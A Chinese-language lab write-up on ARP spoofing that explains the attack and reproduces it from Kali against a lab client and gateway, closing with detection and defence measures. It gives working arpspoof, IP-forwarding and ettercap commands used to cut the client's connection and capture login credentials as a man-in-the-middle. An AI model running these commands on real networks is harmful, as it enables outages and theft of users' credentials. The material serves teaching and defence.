## <u>ARP攻击原理</u>

![img](arp%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0.assets/1650425781545-47fcb696-d114-4599-a543-0581f2ee5d07.png)

网络中有A、B、C三台主机，主机A与主机B正常通信，主机C进入网络，开始实施ARP欺骗。

首先，主机C给主机A发一个ARP应答报文，报文显示主机B的IP地址映射主机C的MAC，主机A收到这个报文，更新自己的ARP缓存表，修改主机B的IP地址对应的MAC。这样，其后主机A发往主机B的数据包均会发给主机C。

如果主机C不转发该数据包到主机B，则主机B认为与主机A的通信发生故障，而主机A无法察觉。

如果主机C转发数据包到主机B，则主机B与主机A之间的通信不受影响，仅仅是主机C监听到主机A到主机B的数据包。同理，主机C发ARP应答报文欺骗主机B，则主机B发往主机A的数据包被主机C监听。

推荐：攻击机发送伪造的ARP广播，导致受害机获得通信目标主机的错误MAC地址，进而受害机流量被发到预期外主机上。

## <u>ARP攻击的危害</u>

冒充其他主机的MAC身份导致：

- **ARP 泛洪攻击**：通过向网关发送大量 ARP 报文，导致网关无法正常响应。

- **ARP 欺骗普通主机攻击**

- **欺骗网关的攻击**

- **中间人攻击**

## ARP攻击复现

### 攻击准备

攻击机： kali

被攻击机：litexp网站服务器

被攻击机：win10客户机

### 欺骗主机实现断网攻击

先在kali中获取需要攻击的目标ip地址以及网关的ip地址：

```shell
# 扫描对应网段所有存活的主机
fping -asg 192.168.96.0/24

# 或者使用也可以得到对应的效果
nmap -sP 192.168.96.0/24
```

![image-20221013215818386](arp%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0.assets/image-20221013215818386.png)



我们确定需要攻击的目标ip：

**客户机IP192.168.96.133**

**服务器的ip:192.168.1.49**

**网关的ip：192.168.96.2**



注意：在执行攻击之前很多命令都需要管理员权限。

这里要用到一个arp欺骗工具：**arpspoof**, 这个工具kali里面直接输入对应的命令回车，如果没有会让你安装。

这个工具相当于可以不停的去发送欺骗数据包。

```shell
arpspoof   -i   网卡   -t    目标IP    网关
arpspoof -i eth0 -t 192.168.96.133 192.168.96.2  #欺骗客户机96.133
也可以使用反向欺骗：
arpspoof   -i   网卡   -t    网关    目标IP
arpspoof -i eth0 -t 192.168.96.2 192.168.96.133 #欺骗网关96.2
```

攻击之前先确定目标客户机可上网

![image-20221013223808255](arp%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0.assets/image-20221013223808255.png)

执行命令：

```php
# 这条命令的意思：
# -i 指定网卡 eth0 kali自己的网卡
# -t 指定目标主机IP
# 192.168.96.133 目标主机IP
# 192.168.96.2 网关的IP
# 意思就是不停的告诉 目标主机， 我是网关我是网关， 然后就断网了
arpspoof -i eth0 -t 192.168.96.133 192.168.96.2
```

![image-20221013224128308](arp%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0.assets/image-20221013224128308.png)

执行之后，目标主机：

![image-20221013224149832](arp%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0.assets/image-20221013224149832.png)

要想结束断网，直接结束arp欺骗即可。

### 流量转发窃取用户隐私数据（中间人）

#### 原理

在上面的例子中我们将客户机给断网了，是因为我们没有开启流量转发。

我们要想获取用户的隐私数据，那么必须要让用户在**不知情**的情况下，进行上网，然后输入一些隐私数据，比如：用户名和密码之类的。

这个时候我们就需要开启kali的流量转发，要让客户机能够上网这个时候的流程就变成了：

**客户机96.133 ====>kali====>网关=====>kali=====>客户机**

相当于就是客户机将数据发送到kali的网卡， kali网卡再将数据转发给网关。

那么我们要做的事情就是：

**kali 欺骗 客户机96.133  自己是网关  =》 正向欺骗**

**kali 欺骗 网关  自己是客户机96.133  =》 反向欺骗**

这样相当于是 kali对流量进行了 **中转**

#### 开启流量转发

```shell
echo 1 > /proc/sys/net/ipv4/ip_forward
```

**/proc/sys/net/ipv4/ip_forward**是配置文件，默认内容为0，表示IP转发是关闭的，使用上述命令将该配置文件的内容改写为1，表示开启IP转发。开启IP转发后 流量会经过kali的主机而后再去到目标所以这时开启arpspoof 那么目标就不会断网，因为流量通过了kali主机那么我们就可以拦截相关数据。

![img](arp%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0.assets/1650465229195-da7ae26d-de9b-4d01-8479-c4649cb38e0e.png)

#### 欺骗客户机96.133

![img](arp%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0.assets/1650465392437-3e8a453b-1f18-4fd3-b15e-12270f11dd5f.png)

查看客户机96.133:

![image-20221013224901803](arp%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0.assets/image-20221013224901803.png)

看一下arp缓存：

![image-20221013224948161](arp%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0.assets/image-20221013224948161.png)

kali的ip成为了网关

#### 欺骗网关

新开一个窗口：

```
arpspoof -i eth0 -t 192.168.96.2 192.168.96.133 #欺骗网关96.2
```



![image-20221013225244866](arp%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0.assets/image-20221013225244866.png)

#### 开启wireshark进行抓包

这一步主要是看是否能抓到包

![img](arp%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0.assets/1650465994054-24c29113-ab7b-4b11-b5d7-9cd0a9e3cbee.png)

在客户机96.133中去ping一下网站服务器：192.168.1.49

![image-20221013230021303](arp%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0.assets/image-20221013230021303.png)

然后看是否能抓到：

![image-20221013230005937](arp%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0.assets/image-20221013230005937.png)

确实抓到了包。

wireshark抓到的二层协议的包，我们要想得到用户的铭感数据，那么需要抓传输层协议的包，也就是抓http包。

#### ettercap进行铭感数据获取

在kali中新开一个窗口：

```shell
# -T 文本模式显示
# -q 安静模式
# -i 指定网卡
ettercap -Tq -i eth0
```

![img](arp%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0.assets/1650467421601-65398302-a024-4ed3-a789-9dcf846cb19a.png)

然后在客户机96.133中进行一个网址的登录：

![img](arp%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0.assets/1650467479206-3be0450a-3be4-4db0-984a-cbe1bb6245c8.png)

观察ettercap：

![image-20221013230316727](arp%E6%94%BB%E5%87%BB%E5%A4%8D%E7%8E%B0.assets/image-20221013230316727.png)

ettercap这个工具很强大，可以干很多事情。但是不要去乱作。

## ARP防御

**1.主机级被动检测**

当系统接收到来自局域网上的ARP请求时，系统检查该请求发送端的IP地址是否与自己的IP地址相同。如果相同，则说明该网络上另有一台机器与自己具有相同的IP地址。

**2.主机级主动检测**

主机定期向所在局域网发送查询自己IP地址的ARP请求报文。如果能够收到另一ARP响应报文，则说明该网络上另有一台机器与自己具有相同的IP地址。

**3.服务器级检测**

当服务器收到ARP响应时，为了证实它的真实性，根据反向地址解析协议(RARP)就用从响应报文中给出的MAC地址再生成一个RARP请求，它询问这样一个问题：“如果你是这个MAC地址的拥有者，请回答你的IP地址”。这样就会查询到这个MAC地址对应的IP地址，比较这两个IP地址，如果不同，则说明对方伪造了ARP响应报文。

**4.网络级检测**

配置主机定期向中心管理主机报告其ARP缓存的内容。这样中心管理主机上的程序就会查找出两台主机报告信息的不一致，以及同一台主机前后报告内容的变化。这些情况反映了潜在的安全问题。或者利用网络嗅探工具连续监测网络内主机硬件地址与IP地址对应关系的变化。

\~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

上面的太官方，下面好懂一点：

- 在客户端使用arp命令绑定网关的真实MAC地址命令如下：

arp -d *(先清除错误的ARP表)

arp -s 192.168.xxx.xxx  xx-xx-xx-xx-xx-xx(静态指定网关的MAC地址)

- 在交换机上做端口与MAC地址的静态帮定。
- 在路由器上做IP地址与MAC地址的静态绑定。
- 使用”ARPSERVER”按一定时间间隔广播网段内所有主机的正确IP-MAC映射表。
- 最主要是要提高用户的安全意识，养成良好的安全习惯，包括：及时安装系统补丁程序，为系统设置强壮的密码，安装防火墙，安装有效的杀毒软件并及时升级病毒库
- 不主动进行网络攻击，不随便运行不受信任的软件。